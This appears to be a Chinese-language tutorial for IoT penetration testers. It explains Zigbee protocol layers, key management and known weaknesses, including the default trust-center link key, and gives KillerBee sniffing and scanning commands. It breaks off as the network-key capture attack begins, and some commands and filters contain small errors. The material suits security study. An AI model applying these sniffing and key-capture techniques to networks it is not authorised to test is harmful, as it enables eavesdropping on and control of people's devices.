# Zigbee与IoT无线攻击实战

> 本文档面向IoT安全研究者与渗透测试工程师，系统讲解Zigbee协议安全分析与攻击实战技术。内容涵盖协议原理、安全机制、嗅探侦察、各类攻击技术、工具使用详解及真实案例复现，适合从入门到进阶的无线安全学习者。

---

## 目录

1. [Zigbee协议深入](#1-zigbee协议深入)
2. [Zigbee安全机制深入](#2-zigbee安全机制深入)
3. [Zigbee侦察与嗅探](#3-zigbee侦察与嗅探)
4. [Zigbee攻击技术](#4-zigbee攻击技术)
5. [KillerBee高级使用](#5-killerbee高级使用)
6. [Zigbee实战案例](#6-zigbee实战案例)
7. [其他IoT无线协议安全](#7-其他iot无线协议安全)
8. [防御与加固建议](#8-防御与加固建议)
9. [工具与资源汇总](#9-工具与资源汇总)

---

## 1. Zigbee协议深入

### 1.1 Zigbee协议栈架构详解

Zigbee协议栈基于IEEE 802.15.4标准，采用分层架构设计，从上到下依次为：应用层（APL）、网络层（NWK）、介质访问控制层（MAC）和物理层（PHY）。每一层都为上层提供特定的服务接口。

```
┌─────────────────────────────────────┐
│        应用层 (APL)                 │
│  ┌─────────┬─────────┬──────────┐  │
│  │   ZCL   │   APS   │   APSME  │  │
│  └─────────┴─────────┴──────────┘  │
├─────────────────────────────────────┤
│        网络层 (NWK)                 │
│  ┌─────────┬──────────────────┐    │
│  │  NLDE   │      NLME        │    │
│  └─────────┴──────────────────┘    │
├─────────────────────────────────────┤
│     介质访问控制层 (MAC)            │
│  ┌─────────┬──────────────────┐    │
│  │  MCPS   │      MLME        │    │
│  └─────────┴──────────────────┘    │
├─────────────────────────────────────┤
│        物理层 (PHY)                 │
│  ┌─────────┬──────────────────┐    │
│  │  PD-SAP │      PLME        │    │
│  └─────────┴──────────────────┘    │
└─────────────────────────────────────┘
```

#### 1.1.1 物理层（PHY）

物理层负责无线信号的收发，基于IEEE 802.15.4标准定义：

- **频段支持**：2.4GHz（全球通用）、868MHz（欧洲）、915MHz（北美）
- **调制方式**：O-QPSK（偏移四相相移键控）
- **数据速率**：250kbps（2.4GHz）、40kbps（915MHz）、20kbps（868MHz）
- **信道数量**：2.4GHz频段16个信道（11-26）、915MHz频段10个信道（1-10）、868MHz频段1个信道（0）
- **发射功率**：通常为0dBm至+20dBm（视地区法规而定）
- **接收灵敏度**：典型值约-97dBm

物理层PDU（协议数据单元）格式：
```
| 前导码(4B) | SFD(1B) | 帧长度(1B) |  PSDU (最大127B)  |
```

#### 1.1.2 介质访问控制层（MAC）

MAC层基于IEEE 802.15.4定义，负责信道接入、帧校验、信标管理等：

- **信道接入机制**：CSMA/CA（载波侦听多路访问/冲突避免）
- **帧类型**：信标帧、数据帧、确认帧、MAC命令帧
- **地址模式**：64位扩展地址（IEEE地址）、16位短地址
- **帧校验**：16位CRC校验
- **GTS（保障时隙）**：在信标使能网络中提供预留带宽

MAC层帧格式：
```
| 帧控制(2B) | 序列号(1B) | 目的PAN ID(0/2B) | 目的地址(0/2/8B) |
| 源PAN ID(0/2B) | 源地址(0/2/8B) |  有效载荷(0-104B)  | FCS(2B) |
```

**安全注意事项**：MAC层支持AES-CCM加密，但多数Zigbee网络使用NWK层或APS层加密，MAC层加密使用较少。

#### 1.1.3 网络层（NWK）

网络层是Zigbee协议的核心，负责网络拓扑管理、路由、设备加入和离开：

- **网络拓扑**：支持星型、树型、网状三种拓扑
- **地址分配**：16位网络地址（NwkAddr），协调器固定为0x0000
- **路由协议**：AODVjr（Ad-hoc On-demand Distance Vector Junior）
- **帧类型**：数据帧、命令帧
- **网络发现**：通过信标请求/响应进行主动扫描

NWK层帧头格式：
```
| 帧控制(2B) | 目的地址(2B) | 源地址(2B) | 半径(1B) | 序列号(1B) |
```

NWK帧控制字段关键位：
- **安全位（Security）**：指示NWK层是否加密
- **源路由位（Source Route）**：指示是否包含源路由子帧
- **发现路由位（Discovery Route）**：路由发现控制
- **帧类型（Frame Type）**：00=数据，01=命令

#### 1.1.4 应用支持子层（APS）

APS层介于NWK层和ZCL之间，提供应用层的数据传输和安全服务：

- **端点（Endpoint）**：支持1-240号端点，每个端点对应一个应用
- **集群（Cluster）**：定义设备间的消息交互格式
- **绑定（Binding）**：建立源端点和目的端点之间的逻辑连接
- **组播（Group）**：支持一对多的组通信
- **APS加密**：提供端到端的应用层加密

APS帧格式：
```
| 帧控制(1B) | 目的端点(1B) | 集群ID(2B) | Profile ID(2B) |
| 源端点(1B) | APS计数器(1B) |  有效载荷  | [APS安全头] |
```

#### 1.1.5 Zigbee集群库（ZCL）

ZCL定义了标准的应用层消息规范，使不同厂商的设备可以互操作：

- **Profile（规范）**：如Home Automation（0x0104）、Smart Energy（0x0109）、Light Link（0xC05E）
- **Cluster（集群）**：如On/Off（0x0006）、Level Control（0x0008）、Temperature Measurement（0x0402）
- **Attribute（属性）**：集群内的数据项，如OnOff属性（0x0000）表示开关状态
- **Command（命令）**：操作属性的指令，如On命令（0x01）、Off命令（0x00）

常见ZCL集群列表：

| 集群ID | 集群名称 | 用途 |
|--------|----------|------|
| 0x0000 | Basic | 设备基本信息查询 |
| 0x0003 | Identify | 设备识别（闪烁等） |
| 0x0006 | On/Off | 开关控制 |
| 0x0008 | Level Control | 亮度/等级调节 |
| 0x0009 | Alarms | 告警管理 |
| 0x0019 | OTA Upgrade | 固件升级 |
| 0x0101 | Door Lock | 门锁控制 |
| 0x0402 | Temperature Measurement | 温度测量 |
| 0x0405 | Relative Humidity | 湿度测量 |
| 0x0500 | IAS Zone | 安防区域 |

### 1.2 网络拓扑结构

#### 1.2.1 星型拓扑（Star）

最简单的拓扑结构，所有设备直接与协调器通信：

```
     [终端设备]       [终端设备]
          \              /
           \            /
            [协调器]
           /            \
          /              \
     [终端设备]       [终端设备]
```

- 特点：结构简单，延迟低
- 局限：覆盖范围有限，所有通信依赖协调器
- 适用场景：小型家庭网络

#### 1.2.2 树型拓扑（Tree / Cluster-Tree）

设备以父子关系形成层级结构，路由器作为中间节点转发数据：

```
           [协调器]
          /    |    \
         /     |     \
    [路由器] [路由器] [终端]
       /  \      \
      /    \      \
  [终端] [终端]  [路由器]
                     \
                      \
                    [终端]
```

- 特点：覆盖范围较大，使用分层地址分配
- 局限：单链路故障可能导致子网失联
- 路由方式：分级路由（Cskip地址分配算法）

#### 1.2.3 网状拓扑（Mesh）

最灵活的拓扑，路由器之间可以建立多条路由路径：

```
    [终端]         [终端]
       |              |
    [路由器] ---- [路由器]
    /   |  \      /  |   \
   /    |   \    /   |    \
[协调器] |  [路由器]  |  [终端]
   \    |   /    \   |    /
    \   |  /      \  |   /
    [路由器] ---- [路由器]
       |              |
    [终端]         [终端]
```

- 特点：自愈能力强，多条冗余路径
- 路由协议：AODVjr + 分级路由混合
- 适用场景：大型工业网络、楼宇自动化

### 1.3 设备类型

Zigbee网络中有三种逻辑设备类型：

#### 1.3.1 协调器（Coordinator / ZC）

- **功能**：负责建立和维护整个网络
- **数量**：每个网络有且仅有一个协调器
- **网络地址**：固定为0x0000
- **职责**：
  - 选择信道和PAN ID
  - 分配网络地址给新加入的设备
  - 管理网络密钥分发
  - 维护网络路由表

#### 1.3.2 路由器（Router / ZR）

- **功能**：转发数据，扩展网络覆盖范围
- **能力**：
  - 可以允许其他设备加入网络
  - 参与路由发现和路由维护
  - 通常为常供电设备
- **适用设备**：智能插座、灯泡、开关面板等

#### 1.3.3 终端设备（End Device / ZED）

- **功能**：仅与父节点（协调器或路由器）通信
- **特点**：
  - 不参与路由转发
  - 可以休眠以节省电量
  - 结构最简单，成本最低
- **适用设备**：传感器、门锁、遥控器等电池供电设备

**FFD vs RFD**：
- **FFD（全功能设备）**：可以担任协调器、路由器或终端设备
- **RFD（精简功能设备）**：只能担任终端设备

### 1.4 寻址方式

Zigbee采用多层寻址机制：

#### 1.4.1 IEEE地址（64位扩展地址）

- 类似以太网MAC地址，全球唯一
- 由IEEE分配，设备出厂时固化
- 格式：例如 00:12:4B:00:0A:1B:2C:3D
- 用于设备加入网络时的身份认证

#### 1.4.2 网络地址（16位短地址/NwkAddr）

- 设备加入网络时由协调器/父节点分配
- 在网络内唯一
- 协调器地址固定为0x0000
- 地址分配方式：
  - 分布式地址分配（Cskip算法）：根据网络深度和最大子节点数计算
  - 随机地址分配：Zigbee 3.0支持随机地址选择

#### 1.4.3 端点（Endpoint）

- 设备内的逻辑通信端口
- 范围：1-240（应用端点），241-254（保留），0（ZDO端点）
- 每个端点对应一个应用Profile
- 类似于TCP/UDP端口的概念

#### 1.4.4 集群（Cluster）

- 定义特定功能的消息集合
- 分为输入集群（Server）和输出集群（Client）
- 通过Cluster ID（16位）标识

**寻址示例**：
```
IEEE: 00:12:4B:00:0A:1B:2C:3D → Nwk: 0x1234 → Endpoint: 0x01 → Cluster: 0x0006
                         （64位全球唯一）   （16位网络内唯一）  （设备内逻辑端口）  （功能模块）
```

### 1.5 Zigbee 3.0新特性

Zigbee 3.0是Zigbee联盟在2016年发布的统一标准，整合了之前的多个Profile：

#### 主要改进：

1. **统一应用层标准**
   - 整合了Home Automation、Light Link、Smart Energy等多个Profile
   - 所有设备使用统一的Base Device Behavior（BDB）规范

2. **加强的安全机制**
   - 强制使用安装代码（Install Code）进行设备认证
   - 改进的密钥分发机制
   - 支持动态网络密钥更新

3. **BDB（Base Device Behavior）**
   - 定义了设备加入网络的标准流程
   - 支持Touchlink、网络 Steering、Finding & Binding等加入方式

4. **Green Power支持**
   - 支持无电池的能量采集设备
   - Green Power设备通过代理设备接入网络

5. **OTA升级标准化**
   - 统一的OTA升级集群规范
   - 支持签名固件验证

### 1.6 与Thread、Z-Wave等协议对比

| 特性 | Zigbee | Thread | Z-Wave |
|------|--------|--------|--------|
| 标准基础 | IEEE 802.15.4 | IEEE 802.15.4 | ITU-T G.9959 |
| 频段 | 2.4GHz/868MHz/915MHz | 2.4GHz | Sub-GHz（868/908MHz） |
| 网络拓扑 | Mesh | Mesh（基于IPv6） | Mesh |
| 最大节点数 | ~65000 | 理论无限制 | 232（主网络） |
| 数据速率 | 250kbps | 250kbps | 100kbps（Max） |
| 安全 | AES-128（NWK/APS） | AES-128（MAC层） | AES-128 |
| 互操作性 | Zigbee 3.0 | Matter/Thread | Z-Wave认证 |
| 功耗 | 低 | 低 | 极低 |
| 典型应用 | 智能家居、工业 | 智能家居（Matter） | 智能家居 |
| 生态系统 | 各大厂商 | Google/Apple/Amazon | Silicon Labs |

**安全对比要点**：
- **Zigbee**：NWK层加密是基础，APS层提供端到端加密；历史上存在默认密钥问题
- **Thread**：基于DTLS的设备加入认证，MAC层加密；安全设计更现代
- **Z-Wave**：使用S0/S2安全框架，S2框架安全性更高；设备加入需用户确认

---

## 2. Zigbee安全机制深入

### 2.1 安全密钥体系

Zigbee安全体系基于三层密钥结构，分别保护不同层面的通信：

```
┌─────────────────────────────────────────┐
│     应用链接密钥 (APS Link Key)        │
│     - 设备间端到端加密                  │
│     - 基于信任中心或预共享              │
├─────────────────────────────────────────┤
│     网络密钥 (NWK Key)                  │
│     - 网络层广播/单播加密               │
│     - 全网共享                          │
├─────────────────────────────────────────┤
│     信任中心链接密钥 (TC Link Key)      │
│     - 设备与信任中心之间的加密          │
│     - 用于网络密钥分发                  │
└─────────────────────────────────────────┘
```

#### 2.1.1 信任中心链接密钥（Trust Center Link Key）

- **作用**：保护设备与信任中心之间的APS层通信
- **用途**：安全地传输网络密钥和应用链接密钥
- **类型**：
  - **全局默认密钥**：`ZigBeeAlliance09`（哈希值：`5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39`）
  - **安装代码派生密钥**：基于设备唯一安装代码派生
  - **预配置唯一密钥**：每设备预烧录的唯一密钥

**安全风险**：大量商业设备仍使用默认的全局信任中心链接密钥，这是Zigbee安全最大的弱点之一。攻击者只需知道默认密钥，即可解密网络密钥传输过程，从而获取网络密钥。

#### 2.1.2 网络密钥（Network Key）

- **作用**：保护NWK层的所有数据帧
- **范围**：全网设备共享同一网络密钥
- **长度**：128位（AES-128）
- **更新**：支持密钥切换（Key Switch）机制
- **帧计数器**：每个设备维护 outgoing frame counter，防止重放攻击

**安全风险**：
- 网络密钥是全网共享的，一旦泄露整个网络暴露
- 许多设备使用固定的默认网络密钥
- 密钥更新机制在实际部署中很少启用

#### 2.1.3 应用链接密钥（Application Link Key）

- **作用**：保护APS层端到端通信
- **范围**：两个特定设备之间共享
- **用途**：对安全性要求高的应用（如门锁、支付设备）
- **分发方式**：
  - 预配置（Preconfigured）
  - 信任中心分发（Transport Key）
  - 密钥协商（Key Establishment，基于CBKE）

### 2.2 密钥分发机制

#### 2.2.1 预配置密钥（Preconfigured Keys）

- 设备出厂时预先烧录密钥
- 最简单但安全性最差
- 攻击者通过固件提取可获取密钥

#### 2.2.2 传输密钥（Transport Key）

设备加入网络时，信任中心通过加密方式将密钥传输给新设备：

```
1. 新设备发送加入请求（Associate Request）
2. 协调器分配网络地址
3. 新设备向信任中心发送Transport Key请求
   （使用信任中心链接密钥加密）
4. 信任中心解密请求，验证设备身份
5. 信任中心用信任中心链接密钥加密网络密钥
6. 新设备解密获得网络密钥
7. （可选）分发应用链接密钥
```

**攻击面分析**：
- 如果信任中心链接密钥是默认密钥，攻击者可被动嗅探获取网络密钥
- 密钥传输过程使用AES-CCM加密，但密钥本身安全性依赖于信任中心链接密钥

#### 2.2.3 密钥协商（Key Establishment）

基于CBKE（Certificate-Based Key Establishment）的密钥协商机制：

- 使用ECDH（椭圆曲线Diffie-Hellman）协商会话密钥
- 基于证书的设备身份认证
- Zigbee Smart Energy Profile使用此机制
- 安全性最高，但实现复杂，普及度低

**安装代码（Install Code）**：
- Zigbee 3.0推荐使用安装代码
- 每个设备有唯一的安装代码（6/8/10/12字节 + CRC16）
- 通过MMO哈希函数派生信任中心链接密钥
- 需要用户在加入时输入安装代码（或通过QR码扫描）

### 2.3 APS加密与NWK加密区别

#### 2.3.1 NWK层加密

- **加密位置**：网络层帧头之后，NWK载荷之前
- **密钥**：网络密钥（全网共享）
- **保护范围**：NWK载荷（含APS层数据）
- **帧计数器**：每个设备维护outgoing计数器
- **使用场景**：所有NWK数据帧的基础保护

NWK安全头格式：
```
| 安全控制(1B) | 帧计数器(4B) | 源IEEE地址(0/8B) | 密钥序号(0/1B) | MIC(0/4/8/16B) |
```

#### 2.3.2 APS层加密

- **加密位置**：APS层内，端到端加密
- **密钥**：应用链接密钥（设备间共享）
- **保护范围**：APS载荷
- **APS计数器**：防止重放攻击
- **使用场景**：高安全需求的应用（门锁、安防等）

**关键区别对比**：

| 特性 | NWK加密 | APS加密 |
|------|---------|---------|
| 加密层级 | 网络层 | 应用支持子层 |
| 密钥类型 | 网络密钥 | 应用链接密钥 |
| 密钥共享范围 | 全网设备 | 仅通信双方 |
| 端到端保护 | 否（每跳都解密） | 是 |
| 路由设备可读 | 是 | 否 |
| 重放保护 | 是（帧计数器） | 是（APS计数器） |
| 计算开销 | 较低 | 较高 |

**攻击意义**：
- 仅使用NWK加密的网络：获取网络密钥即可解密所有通信
- 使用APS加密的网络：即使获取网络密钥，也无法解密端到端加密的APS载荷
- 实际攻击中，许多设备只启用NWK加密，APS加密很少使用

### 2.4 安全模式

Zigbee定义了两种安全模式：

#### 2.4.1 Standard安全模式

- 信任中心是集中式的
- 网络密钥由信任中心分发
- 设备加入时需要信任中心认证
- 适用于大多数家庭和商业网络
- 安全强度：中等

#### 2.4.2 High安全模式

- 所有安全操作都必须经过信任中心
- 强制使用唯一的信任中心链接密钥
- 支持更严格的加入策略
- 支持网络密钥定期更新
- 适用于对安全性要求高的场景
- 安全强度：高

**实际部署情况**：
- 消费级智能家居设备大多使用Standard模式
- 许多设备甚至使用预配置的默认密钥，远未达到Standard模式的安全要求
- High安全模式主要在工业和商业场景中使用

### 2.5 信任中心安全策略

信任中心（Trust Center）是Zigbee网络的安全核心，负责：

1. **设备认证**：验证请求加入网络的设备身份
2. **密钥管理**：生成、分发和更新密钥
3. **安全策略执行**：控制设备的安全行为

#### 信任中心地址模式：

- **集中式信任中心**：单一信任中心节点（通常是协调器）
- **分布式信任中心**：多个节点共享信任中心功能（较少使用）

#### 设备加入策略：

1. **开放加入（Open Join）**：任何设备都可加入（最不安全）
2. **白名单加入**：仅允许预配置的IEEE地址加入
3. **安装代码认证**：需验证安装代码派生的密钥
4. **证书认证**：基于数字证书的强认证（最高安全）

### 2.6 已知安全缺陷与设计弱点

#### 2.6.1 默认密钥问题

- **问题**：大量设备使用默认的信任中心链接密钥（`ZigBeeAlliance09`）
- **影响**：攻击者只需被动嗅探设备加入过程，即可解密并获取网络密钥
- **涉及设备**：大量消费级Zigbee设备
- **CVE参考**：多个厂商设备存在默认密钥配置问题

#### 2.6.2 密钥传输不安全

- **问题**：网络密钥通过信任中心链接密钥加密传输
- **弱点**：如果信任中心链接密钥泄露（如默认密钥），网络密钥完全暴露
- **缺乏前向保密**：一旦密钥泄露，历史通信也可被解密

#### 2.6.3 重放攻击风险

- **问题**：NWK层使用帧计数器防止重放，但存在以下弱点：
  - 帧计数器在设备重启后可能重置
  - 某些设备不验证帧计数器
  - 攻击者可通过干扰使计数器回绕
- **APS层重放**：APS计数器同样存在被绕过的可能

#### 2.6.4 缺乏设备身份强认证

- **问题**：多数设备仅依靠预共享密钥进行身份验证
- **弱点**：
  - 无证书机制（除Smart Energy外）
  - 设备身份可被伪造
  - 攻击者可伪造合法设备加入网络

#### 2.6.5 网络密钥更新困难

- **问题**：网络密钥更新（Key Switch）机制复杂
- **实际情况**：大多数网络从不更新网络密钥
- **影响**：密钥一旦泄露，网络将长期处于暴露状态

#### 2.6.6 明文传输的信息

即使启用了加密，以下信息仍以明文形式存在：
- PAN ID
- 源/目的网络地址
- 设备IEEE地址（在某些帧中）
- 帧类型和控制字段
- 信标帧中的网络信息

**侦察价值**：攻击者可以通过嗅探明文信息进行网络测绘和设备指纹识别。

#### 2.6.7 已知攻击向量汇总

| 攻击类型 | 前提条件 | 难度 | 影响 |
|----------|----------|------|------|
| 被动嗅探网络密钥 | 默认/已知TC链接密钥 | 低 | 全网通信解密 |
| 重放攻击 | 获取有效数据包 | 低 | 设备控制（如开门、开灯） |
| 设备加入攻击 | 物理接触或默认密钥 | 中 | 恶意设备加入网络 |
| 协调器伪造 | 已知PAN ID和信道 | 中 | 网络劫持 |
| APS密钥破解 | 物理接触设备 | 高 | 端到端通信解密 |
| 拒绝服务 | 无需密钥 | 低 | 网络不可用 |

---

## 3. Zigbee侦察与嗅探

### 3.1 Zigbee信道与频率规划

#### 3.1.1 2.4GHz频段

2.4GHz是全球通用的ISM频段，也是Zigbee最常用的频段：

- **信道范围**：11-26号信道（共16个）
- **中心频率计算公式**：`2405 + 5*(channel - 11) MHz`
- **信道间隔**：5MHz
- **数据速率**：250kbps
- **调制方式**：O-QPSK

**2.4GHz信道列表**：

| 信道号 | 中心频率(MHz) |
|--------|---------------|
| 11 | 2405 |
| 12 | 2410 |
| 13 | 2415 |
| 14 | 2420 |
| 15 | 2425 |
| 16 | 2430 |
| 17 | 2435 |
| 18 | 2440 |
| 19 | 2445 |
| 20 | 2450 |
| 21 | 2455 |
| 22 | 2460 |
| 23 | 2465 |
| 24 | 2470 |
| 25 | 2475 |
| 26 | 2480 |

**与WiFi信道干扰关系**：
- WiFi 1频道（2412MHz）与Zigbee 11-13信道重叠
- WiFi 6频道（2437MHz）与Zigbee 17-19信道重叠
- WiFi 11频道（2462MHz）与Zigbee 22-24信道重叠
- Zigbee 15、20、25、26信道相对受WiFi干扰较小

#### 3.1.2 868MHz频段（欧洲）

- **信道**：0号信道
- **中心频率**：868.3MHz
- **数据速率**：20kbps
- **调制方式**：BPSK / ASK

#### 3.1.3 915MHz频段（北美）

- **信道范围**：1-10号信道（共10个）
- **中心频率**：906 + 2*(channel - 1) MHz
- **数据速率**：40kbps
- **调制方式**：O-QPSK

### 3.2 硬件选择

#### 3.2.1 CC2531 USB Dongle（推荐入门）

**概述**：TI CC2531是最常用的Zigbee嗅探硬件，价格低廉，社区支持好。

- **芯片**：TI CC2531F256（8051内核 + 2.4GHz无线）
- **支持频段**：2.4GHz
- **USB接口**：直接插入电脑
- **价格**：约15-30元人民币
- **优点**：便宜、易于获取、固件成熟、支持KillerBee
- **缺点**：仅支持2.4GHz、发射功率有限

**购买渠道**：淘宝、AliExpress、Amazon搜索"CC2531 USB dongle"

#### 3.2.2 CC2540 USB Dongle

- **芯片**：TI CC2540（蓝牙4.0芯片，兼容802.15.4）
- **特点**：体积更小，可同时用于蓝牙嗅探
- **注意**：需刷写特定固件才能用于Zigbee

#### 3.2.3 HackRF One（SDR方案）

**概述**：软件定义无线电平台，支持多种无线协议。

- **频率范围**：1MHz - 6GHz
- **采样率**：最高20Msps
- **支持协议**：Zigbee、蓝牙、WiFi、GSM、GPS等
- **价格**：约1500-3000元
- **优点**：功能全面、支持Sub-GHz、可做多种协议分析
- **缺点**：价格高、配置复杂、体积大

#### 3.2.4 ATUSB / RZUSB Stick

- **芯片**：AT86RF230 / AT86RF231
- **厂商**：Atmel（现Microchip）
- **特点**：官方开发工具，性能稳定
- **支持**：KillerBee原生支持
- **价格**：较贵，约300-500元

#### 3.2.5 其他硬件

| 硬件 | 频段 | 价格 | 推荐指数 |
|------|------|------|----------|
| CC2531 USB Dongle | 2.4GHz | 低 | ★★★★★ |
| CC2592+CC2531（功放版） | 2.4GHz | 中 | ★★★★☆ |
| HackRF One | 1M-6G | 高 | ★★★★☆ |
| ATUSB | 2.4GHz | 中 | ★★★☆☆ |
| nRF52840 Dongle | 2.4GHz | 中 | ★★★☆☆ |
| Ubertooth One | 2.4GHz | 中高 | ★★★☆☆ |

**推荐组合**：
- **入门**：1个CC2531 Dongle（嗅探）
- **进阶**：2个CC2531 Dongle（一个嗅探，一个注入）+ 天线
- **专业**：HackRF One + CC2531 + 各种天线

### 3.3 固件烧录与工具配置

#### 3.3.1 CC2531固件烧录

**所需工具**：
- CC2531 USB Dongle
- CC Debugger 或 自制烧录线
- Flash Programmer 2（TI官方工具）
- zigbee-sniffer-firmware 固件

**固件获取**：
```bash
# 从GitHub下载预编译固件
# 项目地址：https://github.com/ Riverloop/zigbee-sniffer-firmware
# 或使用KillerBee项目中的固件
```

**烧录步骤（Windows）**：

1. 安装TI Flash Programmer 2
2. 将CC Debugger连接到CC2531的调试引脚
3. 打开Flash Programmer 2
4. 选择目标芯片：CC2531F256
5. 加载固件文件（.hex格式）
6. 点击"Perform actions"烧录

**烧录步骤（Linux - cc-tool）**：

```bash
# 安装cc-tool
sudo apt-get install cc-tool

# 连接CC Debugger，检测芯片
sudo cc-tool -e

# 烧录固件
sudo cc-tool -e -w zigbee-sniffer.hex -v
```

**注意**：CC2531有两种常用固件：
1. **嗅探固件**：用于数据包捕获（配合Wireshark或KillerBee）
2. **KillerBee固件**：用于发送和接收（支持注入攻击）

#### 3.3.2 KillerBee环境搭建

**KillerBee**是Zigbee安全研究的核心工具框架，由River Loop Security开发。

**安装步骤（Kali Linux）**：

```bash
# 安装依赖
sudo apt-get install python3-usb python3-serial python3-crypto python3-gtk2 wireshark

# 克隆KillerBee仓库
git clone https://github.com/riverloopsec/killerbee.git
cd killerbee

# 安装
sudo python3 setup.py install

# 验证安装
zbid --help
```

**安装步骤（Windows）**：
1. 安装Python 3.x
2. 安装libusb-win32驱动（使用Zadig工具）
3. `pip install pyserial pyusb pycrypto`
4. 克隆并安装KillerBee

**USB权限配置（Linux）**：

```bash
# 创建udev规则
sudo tee /etc/udev/rules.d/99-killerbee.rules << 'EOF'
# CC2531 Zigbee Dongle
SUBSYSTEM=="usb", ATTRS{idVendor}=="0451", ATTRS{idProduct}=="16ae", MODE="0666"
# ATUSB
SUBSYSTEM=="usb", ATTRS{idVendor}=="03eb", ATTRS{idProduct}=="204e", MODE="0666"
EOF

# 重新加载udev规则
sudo udevadm control --reload-rules
sudo udevadm trigger
```

### 3.4 Wireshark Zigbee协议解析

#### 3.4.1 配置Wireshark用于Zigbee

**启用Zigbee协议解析**：
1. 打开Wireshark
2. 选择捕获接口（需要KillerBee或专用嗅探工具提供接口）
3. 配置Zigbee解密密钥

**配置解密密钥**：
1. 菜单：Edit → Preferences → Protocols → ZigBee
2. 点击"Edit"旁边的"Pre-configured keys"
3. 添加密钥：
   - **Label**：网络密钥标识（如"NWK Key"）
   - **Key**：16字节十六进制密钥（如`01030507090b0d0f00020406080a0c0d`）
   - **Byte Index**：起始字节偏移（通常为0）

**使用zbdump捕获并在Wireshark中查看**：

```bash
# 使用KillerBee的zbdump捕获数据包，保存为pcap格式
zbdump -c 15 -w zigbee_capture.pcap -i 0

# 在Wireshark中打开
wireshark zigbee_capture.pcap
```

#### 3.4.2 Wireshark Zigbee显示过滤器

**常用过滤表达式**：

```
# 仅显示Zigbee NWK层数据包
zbee_nwk

# 过滤特定PAN ID
zbee_nwk.dst == 0x1234
zbee_nwk.src == 0x5678

# 过滤特定网络地址
zbee_nwk.dst16 == 0x0000
zbee_nwk.src16 == 0x1234

# 显示ZDO命令
zbee_zdo

# 显示ZCL On/Off集群命令
zbee_zcl && zbee_zcl.cluster == 0x0006

# 显示未加密的数据包
zbee_nwk.security == 0

# 显示加密的数据包
zbee_nwk.security == 1
```

#### 3.4.3 数据包结构解读

在Wireshark中查看Zigbee数据包时，典型的分层结构：

```
Frame
├── IEEE 802.15.4 Data
│   ├── Frame Control Field
│   ├── Sequence Number
│   ├── Destination PAN
│   ├── Destination Address
│   ├── Source PAN
│   ├── Source Address
│   └── IEEE 802.15.4 Payload
│       └── ZigBee Network Layer
│           ├── Frame Control
│           ├── Destination Address
│           ├── Source Address
│           ├── Radius
│           ├── Sequence Number
│           ├── [ZigBee Security Header]  ← 加密时存在
│           └── ZigBee Application Support Layer
│               ├── Frame Control
│               ├── Destination Endpoint
│               ├── Cluster ID
│               ├── Profile ID
│               ├── Source Endpoint
│               ├── Counter
│               └── ZigBee Cluster Library
│                   └── ...
└── FCS
```

### 3.5 网络发现与设备枚举

#### 3.5.1 使用zbstumbler进行网络扫描

zbstumbler是KillerBee中的主动扫描工具，可以发现附近的Zigbee网络。

**基本使用**：

```bash
# 扫描所有2.4GHz信道（11-26）
zbstumbler -c 11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26

# 扫描特定信道
zbstumbler -c 15

# 使用指定接口
zbstumbler -i 0 -c 15
```

**输出示例**：
```
ZigBee Stumbler v1.0
[*] Scanning channels: [11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26]
[*] Using interface fw: kbfw-cc2531, hw: CC2531 dongle
[+] Beacon Request sent on channel 11
[+] Beacon Response:
    Channel: 15
    PAN ID: 0x1A2B
    Coordinator: 0x0000
    Extended PAN ID: 00:12:4B:00:01:02:03:04
    Protocol Version: 2
    Stack Profile: 2 (ZigBee)
    Device Type: Coordinator
    Receive On When Idle: True
    Security: True
    ...
```

#### 3.5.2 被动设备枚举

通过监听网络流量，可以发现网络中的设备：

```bash
# 使用zbdump捕获一段时间的流量
zbdump -c 15 -w network_scan.pcap -i 0

# 用tshark统计设备地址
tshark -r network_scan.pcap -T fields -e zbee_nwk.src16 -e zbee_nwk.dst16 | sort -u
```

**枚举信息包括**：
- PAN ID
- 协调器地址（通常为0x0000）
- 活跃的路由器和终端设备地址
- 设备IEEE地址（从某些帧中获取）
- 设备类型（通过流量特征推断）

#### 3.5.3 设备指纹识别

通过分析设备的通信特征进行指纹识别：

**识别依据**：
1. **集群列表**：设备支持的ZCL集群可以反映设备类型
2. **Profile ID**：如HA（0x0104）、SE（0x0109）
3. **通信模式**：传感器周期性上报、开关类事件驱动
4. **设备描述符**：通过ZDO请求获取
5. **Manufacturer ID**：厂商ID（部分设备在Basic集群中提供）

**使用ZDO请求枚举设备**：

```bash
# 发送Active EP请求（获取设备的活跃端点）
# 这需要使用KillerBee API编写脚本（详见第5章）
```

### 3.6 KillerBee工具框架使用详解

KillerBee是一个功能强大的Zigbee安全研究框架，包含多个工具和Python API。

#### 3.6.1 工具概览

| 工具 | 功能 |
|------|------|
| zbid | 识别连接的KillerBee兼容设备 |
| zbstumbler | 主动扫描发现Zigbee网络 |
| zbdump | 数据包捕获（类似tcpdump） |
| zbreplay | 数据包重放攻击 |
| zbfake | 伪造协调器/设备 |
| zbgoodfind | 查找网络密钥 |
| zbconvert | 数据包格式转换 |
| zborphannotify | 孤儿通知攻击 |
| zbscapy | Scapy集成（Zigbee层） |

#### 3.6.2 zbid设备识别

```bash
# 列出所有兼容设备
zbid

# 输出示例：
# ID      Product                 Serial
# 0       CC2531 dongle           0x0123456789ABCDEF
# 1       CC2531 dongle           0xFEDCBA9876543210
```

#### 3.6.3 zbstumbler网络扫描

```bash
# 基本扫描
zbstumbler -c 11-26

# 指定接口
zbstumbler -i 0 -c 15

# 详细输出
zbstumbler -v -c 11-26
```

#### 3.6.4 zbdump数据包捕获

```bash
# 在信道15上捕获，保存到文件
zbdump -c 15 -w capture.pcap -i 0

# 捕获指定数量的数据包后退出
zbdump -c 15 -c 100 -w capture.pcap

# 实时显示数据包摘要
zbdump -c 15 -i 0 -v

# 过滤特定PAN ID
zbdump -c 15 -p 0x1A2B -w capture.pcap
```

---

## 4. Zigbee攻击技术

### 4.1 网络密钥攻击

网络密钥是Zigbee安全的核心，获取网络密钥意味着可以解密整个网络的通信。

#### 4.1.1 密钥嗅探与破解（网络密钥捕获）

**攻击原理**：当新设备加入网络时，信任中心会使用信任中心链接密钥加密网络密钥并发送给新设备。如果信任中心链接密钥已知（如默认密钥），攻击者可以被动嗅探此过程并解密获得网络密钥。

**攻击流程**：

```
攻击者 ──被动嗅探──→ 空中数据包
    ↑
    │  捕获Transport Key帧
    │  使用已知TC链接密钥解密
    ↓
获取网络密钥 → 解密所有NWK加密通信
```

